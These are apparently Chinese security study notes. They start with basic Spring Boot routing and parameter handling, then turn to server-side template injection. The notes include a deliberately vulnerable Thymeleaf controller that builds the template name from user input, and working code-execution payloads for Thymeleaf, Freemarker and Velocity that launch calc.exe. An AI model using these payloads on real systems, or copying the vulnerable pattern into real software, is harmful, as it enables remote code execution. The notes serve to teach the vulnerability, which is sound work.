## SpringBoot

### 路由映射

```
  
@RequestMapping("/index")  
public String index() {  
    return "index";  
}  
  
//@RequestMapping(value = "/indexg", method = RequestMethod.GET)  
@GetMapping("/indexg")  
public String indexg() {  
    return "indexg";  
}  
  
//@RequestMapping(value = "/indexp", method = RequestMethod.POST)  
@PostMapping("/indexp")  
public String indexp() {  
    return "indexp";  
}
```

两种方式映射路由

### 参数传递

```
@GetMapping("/indexgp")  
public String indexgp(@RequestParam String name) {  
    return name;  
}  
  
@PostMapping("/indexpp")  
public String indexpp(@RequestParam String name) {  
    return name;  
}
```

### 数据响应

```
package com.example.springdemo.Controller;  
  
import org.springframework.web.bind.annotation.*;  
  
  
@RestController  
public class IndexController {  
  
  
    @RequestMapping("/index")  
    public String index() {  
        return "index";  
    }  
  
    //@RequestMapping(value = "/indexg", method = RequestMethod.GET)  
    @GetMapping("/indexg")  
    public String indexg() {  
        return "indexg";  
    }  
  
    //@RequestMapping(value = "/indexp", method = RequestMethod.POST)  
    @PostMapping("/indexp")  
    public String indexp() {  
        return "indexp";  
    }  
  
    @GetMapping("/indexgp")  
    public String indexgp(@RequestParam String name) {  
        return name;  
    }  
  
    @PostMapping("/indexpp")  
    public String indexpp(@RequestParam String name) {  
        return name;  
    }  
  
}
```

## 模板引擎

### Thymeleaf

参考 https://xz.aliyun.com/news/9962

1、新建SpringBoot项目包含Web,Thymeleaf
2、配置application.properties修改缓存
3、创建模版目录和文件，文件定义修改变量
4、新建Controller目录及文件，指定路由配置
5、更换SpringBoot及Thymeleaf版本测试POC

```
@Controller

public class IndexController {

@RequestMapping("/index")

public String index(Model model) {

//替换模版html文件中的data变量值

model.addAttribute("data", "你好 小迪");

//使用index模版文件

return "index";

}

@RequestMapping("/indexs")

public String index(Model model,@RequestParam String lang) {

//替换模版html文件中的data变量值

model.addAttribute("data", "Hello xiaodi");

//使用index+变量lang模版文件

return "index-"+lang;

}

}
```

利用条件 Thymeleaf漏洞版本，可控模版变量

POC __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x

### Freemarker

参考 https://mp.weixin.qq.com/s/TtNxfSYsB4HMEpW_OBniew

1、新建SpringBoot项目包含Web,Freemarker
2、配置application.properties修改缓存
3、创建模版目录和文件，文件定义修改变量
4、新建Controller目录及文件，指定路由配置
5、更换SpringBoot及Freemarker版本测试POC

```
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}

<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}

<#assign value="freemarker.template.utility.JythonRuntime"?new()>${value("calc.exe")}<@value>import os;os.system("calc.exe")</@value>//@value为自定义标签
```

利用条件 可控渲染的模版文件

## Velocity

参考 https://blog.csdn.net/2401_83799022/article/details/141600988

```
<dependency>

<groupId>org.apache.velocity</groupId>

<artifactId>velocity</artifactId>

<version>1.7</version>

</dependency>

1、Velocity.evaluate

2、template.merge(ctx, out)

Poc：%23set($e%3D"e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
```

利用条件 Velocity漏洞版本，可控模版变量或文件



